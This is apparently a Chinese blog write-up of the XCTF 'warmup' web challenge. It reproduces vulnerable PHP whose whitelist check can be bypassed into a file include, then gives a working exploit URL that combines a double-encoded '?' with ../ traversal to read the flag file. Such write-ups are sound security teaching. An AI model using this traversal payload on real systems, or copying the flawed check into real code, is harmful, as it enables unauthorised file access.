https://blog.csdn.net/qq_42016346/article/details/104199710
# 一、warmup

题目链接：https://adworld.xctf.org.cn/task/task_list?type=web&number=3&grade=1&page=1

# 二、使用步骤

## 1.点击获取在线场景

![在这里插入图片描述](https://img-blog.csdnimg.cn/cf723cc2e373432197a7a9a3f7a01931.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5oSa5YWs5pCs5Luj56CB,size_20,color_FFFFFF,t_70,g_se,x_16)

## 2.进入页面

![在这里插入图片描述](https://img-blog.csdnimg.cn/85506fcba0fa476b9399357bb008e9ec.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5oSa5YWs5pCs5Luj56CB,size_20,color_FFFFFF,t_70,g_se,x_16)  
打开source.php页面  
![在这里插入图片描述](https://img-blog.csdnimg.cn/9c4844cc8fe14f3f8b67c95942351804.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5oSa5YWs5pCs5Luj56CB,size_20,color_FFFFFF,t_70,g_se,x_16)

```python
<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?>
```

得到另一个地址/hint.php，打开以后提示我们flag在ffffllllaaaagggg里面

![在这里插入图片描述](https://img-blog.csdnimg.cn/18264c86cd05474a9e7a136795e6d874.png)  
继续审计source.php代码

```python
if (! empty($_REQUEST['file'])  //$_REQUEST['file']值非空
    && is_string($_REQUEST['file'])  //$_REQUEST['file']值为字符串
    && emmm::checkFile($_REQUEST['file'])  //能够通过checkFile函数校验
) {
    include $_REQUEST['file'];  //包含$_REQUEST['file']文件
    exit;
} else {
    echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    //打印滑稽表情
} 
```

需要满足三个条件

```python
1.值为非空
2.值为字符串
3.能够通过checkFile()函数校验
```

checkFile()函数如下

```python
highlight_file(__FILE__); //打印代码
class emmm  //定义emmm类
{
    public static function checkFile(&$page)//将传入的参数赋给$page
    {
        $whitelist = ["source"=>"source.php","hint"=>"hint.php"];//声明$whitelist（白名单）数组
        if (! isset($page) || !is_string($page)) {//若$page变量不存在或非字符串
            echo "you can't see it";//打印"you can't see it"
            return false;//返回false
        }
 
        if (in_array($page, $whitelist)) {//若$page变量存在于$whitelist数组中
            return true;//返回true
        }
 
        $_page = mb_substr(//该代码表示截取$page中'?'前部分，若无则截取整个$page
            $page,
            0,
            mb_strpos($page . '?', '?')
        );
        if (in_array($_page, $whitelist)) {
            return true;
        }
 
        $_page = urldecode($page);//url解码$page
        $_page = mb_substr(
            $_page,
            0,
            mb_strpos($_page . '?', '?')
        );
        if (in_array($_page, $whitelist)) {
            return true;
        }
        echo "you can't see it";
        return false;
    }
}
```

分析代码得到

```python
http://111.200.241.244:60372/source.php?file=source.php%253f../../../../../ffffllllaaaagggg
```

![在这里插入图片描述](https://img-blog.csdnimg.cn/7b7bb55350d64c71927163dcff8fea1b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5oSa5YWs5pCs5Luj56CB,size_20,color_FFFFFF,t_70,g_se,x_16)  
发现flag：`flag{25e7bce6005c4e0c983fb97297ac6e5a}`